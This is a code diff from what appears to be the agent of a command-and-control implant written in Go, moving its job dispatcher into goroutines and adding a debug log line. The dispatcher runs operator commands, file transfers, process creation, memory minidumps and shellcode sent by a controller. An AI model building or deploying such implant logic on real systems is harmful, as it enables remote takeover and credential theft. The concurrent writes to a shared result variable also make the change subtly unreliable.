@@ -42,59 +42,60 @@ func executeJob() {
 	for {
 		var result jobs.Results
 		job := <-jobsIn
-		switch job.Type {
-		case jobs.CMD:
-			result = commands.ExecuteCommand(job.Payload.(jobs.Command))
-		case jobs.FILETRANSFER:
-			if job.Payload.(jobs.FileTransfer).IsDownload {
-				result = commands.Download(job.Payload.(jobs.FileTransfer))
-			} else {
-				ft, err := commands.Upload(job.Payload.(jobs.FileTransfer))
-				if err != nil {
-					result.Stderr = err.Error()
+		// Need a go routine here so that way a job or command doesn't block
+		go func(job jobs.Job) {
+			switch job.Type {
+			case jobs.CMD:
+				result = commands.ExecuteCommand(job.Payload.(jobs.Command))
+			case jobs.FILETRANSFER:
+				if job.Payload.(jobs.FileTransfer).IsDownload {
+					result = commands.Download(job.Payload.(jobs.FileTransfer))
+				} else {
+					ft, err := commands.Upload(job.Payload.(jobs.FileTransfer))
+					if err != nil {
+						result.Stderr = err.Error()
+					}
+					jobsOut <- jobs.Job{
+						AgentID: job.AgentID,
+						ID:      job.ID,
+						Token:   job.Token,
+						Type:    jobs.FILETRANSFER,
+						Payload: ft,
+					}
 				}
-				jobsOut <- jobs.Job{
-					AgentID: job.AgentID,
-					ID:      job.ID,
-					Token:   job.Token,
-					Type:    jobs.FILETRANSFER,
-					Payload: ft,
+			case jobs.MODULE:
+				switch strings.ToLower(job.Payload.(jobs.Command).Command) {
+				case "createprocess":
+					result = commands.CreateProcess(job.Payload.(jobs.Command))
+				case "minidump":
+					ft, err := commands.MiniDump(job.Payload.(jobs.Command))
+					if err != nil {
+						result.Stderr = err.Error()
+					}
+					jobsOut <- jobs.Job{
+						AgentID: job.AgentID,
+						ID:      job.ID,
+						Type:    jobs.FILETRANSFER,
+						Payload: ft,
+					}
+				default:
+					result.Stderr = fmt.Sprintf("unknown module command: %s", job.Payload.(jobs.Command).Command)
 				}
-				continue
-			}
-		case jobs.MODULE:
-			switch strings.ToLower(job.Payload.(jobs.Command).Command) {
-			case "createprocess":
-				result = commands.CreateProcess(job.Payload.(jobs.Command))
-			case "minidump":
-				ft, err := commands.MiniDump(job.Payload.(jobs.Command))
-				if err != nil {
-					result.Stderr = err.Error()
-				}
-				jobsOut <- jobs.Job{
-					AgentID: job.AgentID,
-					ID:      job.ID,
-					Type:    jobs.FILETRANSFER,
-					Payload: ft,
-				}
-				continue
+			case jobs.NATIVE:
+				result = commands.Native(job.Payload.(jobs.Command))
+			case jobs.SHELLCODE:
+				result = commands.ExecuteShellcode(job.Payload.(jobs.Shellcode))
 			default:
-				result.Stderr = fmt.Sprintf("unknown module command: %s", job.Payload.(jobs.Command).Command)
+				result.Stderr = fmt.Sprintf("Invalid job type: %d", job.Type)
 			}
-		case jobs.NATIVE:
-			result = commands.Native(job.Payload.(jobs.Command))
-		case jobs.SHELLCODE:
-			result = commands.ExecuteShellcode(job.Payload.(jobs.Shellcode))
-		default:
-			result.Stderr = fmt.Sprintf("Invalid job type: %d", job.Type)
-		}
-		jobsOut <- jobs.Job{
-			AgentID: job.AgentID,
-			ID:      job.ID,
-			Token:   job.Token,
-			Type:    jobs.RESULT,
-			Payload: result,
-		}
+			jobsOut <- jobs.Job{
+				AgentID: job.AgentID,
+				ID:      job.ID,
+				Token:   job.Token,
+				Type:    jobs.RESULT,
+				Payload: result,
+			}
+		}(job)
 	}
 }
 
@@ -127,6 +128,7 @@ func getJobs() messages.Base {
 
 // jobHandler takes a list of jobs and places them into job channel if they are a valid type
 func (a *Agent) jobHandler(Jobs []jobs.Job) {
+	cli.Message(cli.DEBUG, "Entering into agent.jobHandler() function")
 	for _, job := range Jobs {
 		// If the job belongs to this agent
 		if job.AgentID == a.ID {
